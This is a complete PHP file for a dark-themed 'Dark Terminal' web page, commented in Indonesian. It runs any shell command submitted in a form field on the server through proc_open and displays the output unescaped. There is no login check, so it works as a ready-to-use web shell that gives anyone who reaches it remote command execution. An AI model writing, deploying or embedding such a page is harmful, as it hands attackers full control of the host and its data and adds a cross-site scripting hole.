<?php
session_start();

// -- Contoh mekanisme logout (opsional) --
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}

// -- Eksekusi Perintah Terminal --
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    $command = $_POST['command'];
    ob_start();  // Tangkap output

    echo "<h2>Execution Result:</h2>";

    $descriptors = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w"),
    );

    $process = proc_open($command, $descriptors, $pipes);

    if (is_resource($process)) {
        // Masukkan input jika perlu
        fwrite($pipes[0], "y\n");
        fclose($pipes[0]);

        // Baca keluaran
        $output = stream_get_contents($pipes[1]);
        $error  = stream_get_contents($pipes[2]);

        fclose($pipes[1]);
        fclose($pipes[2]);

        $status = proc_close($process);

        echo "<pre>$output</pre>";
        if ($error) {
            echo "<pre style='color:red;'>$error</pre>";
        }
    } else {
        echo "Failed to open process.";
    }

    $content = ob_get_clean(); // Ambil seluruh hasil
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Terminal - Dark Orange Theme</title>
    <style>
    /* ----- Gaya Tampilan Mirip Screenshot ----- */
    body {
      margin:0;
      padding:0;
      background:#1e1e1e; 
      color:#fff; 
      font-family:sans-serif;
    }
    header {
      background:#111; 
      padding:10px 20px; 
      border-bottom:3px solid #f70; 
      display:flex; 
      justify-content:space-between; 
      align-items:center;
    }
    header h1 {
      margin:0; 
      font-size:1.2em; 
      color:#f70;
    }
    .logout a {
      color:#ff4e50; 
      text-decoration:none; 
      border:2px solid #ff4e50; 
      padding:4px 10px; 
      border-radius:4px;
    }
    .logout a:hover {
      background:#ff4e50; 
      color:#111;
    }
    .container {
      padding:20px;
    }
    h2 {
      color:#f70;
      margin-top:0;
    }
    .term-box {
      background:#282828;
      border:2px solid #f70;
      border-radius:6px;
      padding:20px;
      margin-bottom:20px;
    }
    label {
      display:block;
      margin-bottom:6px;
      font-weight:bold;
    }
    input[type=text] {
      width:100%;
      background:#333; 
      border:1px solid #444; 
      color:#fff; 
      border-radius:4px; 
      padding:8px;
    }
    input[type=text]::placeholder {
      color:#aaa;
    }
    .btn-submit {
      background:#f70; 
      color:#111; 
      border:none; 
      padding:8px 16px; 
      cursor:pointer; 
      border-radius:4px; 
      font-weight:bold;
      margin-top:10px;
    }
    .btn-submit:hover {
      background:#ffa500;
    }
    pre {
      background:#1e1e1e; 
      border:1px solid #444; 
      padding:10px; 
      border-radius:6px; 
      overflow:auto;
      font-size:0.9em;
      line-height:1.4em;
    }
    </style>
</head>
<body>
<header>
  <h1>Dark Terminal</h1>
  <div class="logout">
    <a href="?logout=true">Logout</a>
  </div>
</header>

<div class="container">
  <div class="term-box">
    <h2>Terminal</h2>
    <form method="post">
      <label for="command">Enter terminal command:</label>
      <input type="text" name="command" id="command" placeholder="ls -la" autocomplete="off" required>
      <input type="submit" class="btn-submit" value="Run">
    </form>
  </div>

  <!-- Tampilkan hasil eksekusi -->
  <?php if (!empty($content)) {
      echo '<div class="term-box">';
      echo $content;
      echo '</div>';
  } ?>
</div>
</body>
</html>
